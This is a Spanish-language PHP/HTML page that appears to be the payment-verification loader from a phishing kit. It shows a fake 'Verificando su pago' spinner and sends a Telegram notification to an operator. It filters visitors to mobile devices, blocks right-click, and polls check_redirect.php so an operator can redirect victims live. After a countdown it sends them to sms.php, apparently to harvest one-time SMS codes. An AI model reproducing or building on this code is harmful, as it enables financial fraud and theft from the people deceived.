
<?php
require_once 'functions.php';

checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('loader');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0;
            margin: 0;
        }
        .header {
            text-align: center;
            margin-bottom: 0px;
            width: 100%;
            padding-top: 0px;
        }
        .logo {
            font-size: 3em;
        }
        .loader-container {
            text-align: center;
            color: black;
            width: 102%;
            max-width: 1000px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 70px;
        }
        .spinner {
            border: 6px solid rgba(0,0,0,0.1);
            border-top: 6px solid #177ECF;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1em;
            opacity: 0.9;
            margin-bottom: 8px;
            margin-top: 10px;
        }
        .countdown {
            font-size: 1em;
            opacity: 0.8;
            margin-top: 10px;
            margin-bottom: 160px;
        }

        /* Styles para asegurar la correcta posición del footer */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            width: 100%;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 200px); /* Altura mínima para empujar el footer */
        }

        /* Corrección para el footer */
        body {
            padding: 0 !important;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="header">
            <a href="https://imgbb.com/"><img src="https://i.ibb.co/jP4NGJnh/T-l-chargement-2.jpg" alt="T-l-chargement-2" border="0" /></a>
        </div>
        
        <div class="loader-container">
            <div class="spinner"></div>
            <h2>Procesando</h2>
            <p>Verificando su pago...</p>
            <p>Por favor espere</p>
            <div class="countdown" id="countdown">
                <span id="timer">60</span> segundos
            </div>
        </div>
    </div>

    <?php include 'footer.php'; ?>


<script>
// Evitar clic derecho en toda la página
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Evitar clic en las imágenes
document.addEventListener('DOMContentLoaded', function() {
    const images = document.querySelectorAll('img');
    images.forEach(img => {
        img.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        // Evitar arrastrar y soltar
        img.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
    });
});
</script>





    <script>
        let seconds = 60;
        const countdownElement = document.getElementById('timer');
        
        const countdown = setInterval(function() {
            seconds--;
            countdownElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(countdown);
                window.location.href = 'sms.php';
            }
        }, 1000);

        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>

